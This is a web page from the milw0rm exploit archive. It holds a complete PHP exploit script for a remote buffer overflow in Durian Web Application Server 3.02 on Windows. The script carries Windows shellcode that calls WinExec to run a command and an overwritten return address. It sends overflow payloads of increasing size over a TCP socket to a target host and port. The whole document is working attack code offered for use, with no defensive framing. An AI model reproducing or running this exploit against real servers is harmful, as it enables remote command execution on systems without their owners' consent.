<html><head><title>Durian Web Application Server 3.02 Remote Buffer Overflow Exploit</title></head><pre>&lt;?php
/*
Durian Web Application Server 3.02 freeware for Win32 buffer
overflow execute command exploit

by rgod
mail: retrog at alice dot it
site: http://retrogod.altervista.org

tested against xp sp2 ita

software site -&gt; http://sourceforge.net/projects/durian/

*/

error_reporting(E_ALL);
$address = &quot;192.168.1.3&quot;;
$service_port = &quot;4002&quot;;

$shellcode =
&quot;\xeb\x1b&quot;.
&quot;\x5b&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\x31\xc0&quot;.
&quot;\x88\x43\x59&quot;.
&quot;\x53&quot;.
&quot;\xbb\x6d\x13\x86\x7c&quot;. //WinExec, 0x7c86136d
&quot;\xff\xd3&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\xbb\xda\xcd\x81\x7c&quot;. //ExitProcess, 0x7c81cdda
&quot;\xff\xd3&quot;.
&quot;\xe8\xe0\xff\xff\xff&quot;.
&quot;\x63\x6d\x64&quot;.
&quot;\x2e&quot;.
&quot;\x65&quot;.
&quot;\x78\x65&quot;.
&quot;\x20\x2f&quot;.
&quot;\x63\x20&quot;.
&quot;cmd.exe /c start notepad &amp; &quot;;

//$eip=&quot;\x72\xe0\xf1\x00&quot;;//DEP disabled
$eip=&quot;\x72\xe0\xf2\x00&quot;;

$ch  =array(&quot;\xaa&quot;,&quot;\xa0&quot;,&quot;\x41&quot;);
$size=array(30,70,150,330,520,700,1400,2300);

    for ($j=0; $j&lt;count($ch); $j++){
        for ($i=0; $i&lt;count($size); $i++){
            $junk=&quot;&quot;;
            if (($j==2) and ($i==7)){
                $junk =&quot;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVXXXX&quot;;
                $junk.=&quot;YYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuu&quot;;
		$junk.=$eip; //jmp shellcode
		for ($n=1; $n&lt;=100; $n++){
		    $junk.=&quot;\x90&quot;;
		}
		$junk.=$shellcode;
                for ($n=1; $n=(2300-strlen($junk)); $n++){
		    $junk.=&quot;\x90&quot;;
		}
            }
            else {
		for ($k=1; $k&lt;=$size[$i]; $k++){
                    $junk.=$ch[$j];
                }
	    }
            $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            if ($socket &lt; 0) {
                die(&quot;socket_create() failed:\n reason: &quot; . socket_strerror($socket) . &quot;\n&quot;);
            }
            $result = socket_connect($socket, $address, $service_port);
            if ($result &lt; 0) {
                die(&quot;socket_connect() failed:\n reason: ($result) &quot; . socket_strerror($result) . &quot;\n&quot;);
            }
            $in = $junk;
            socket_write($socket, $in, strlen ($in));
            socket_close($socket);
        }
   }
?&gt;

# milw0rm.com [2006-12-29]</pre></html>